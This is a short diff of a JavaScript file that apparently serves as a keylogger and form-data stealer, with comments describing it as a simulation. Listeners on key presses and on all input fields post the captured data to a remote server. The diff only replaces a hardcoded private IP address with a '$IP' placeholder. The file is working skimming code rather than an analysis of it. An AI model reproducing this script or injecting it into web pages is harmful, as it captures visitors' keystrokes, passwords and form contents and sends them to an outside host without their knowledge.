@@ -1,6 +1,6 @@
 document.addEventListener('keyup', (e) => {
   // Simulate keylogging by sending to server
-  fetch('https://192.168.153.136:8999/', {
+  fetch('https://$IP:8999/', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
@@ -12,7 +12,7 @@ document.addEventListener('keyup', (e) => {
 // Simulate stealing form data by sending to server
 document.querySelectorAll('input').forEach(input => {
   input.addEventListener('change', () => {
-    fetch('https://192.168.153.136:8999/', {
+    fetch('https://$IP:8999/', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json'
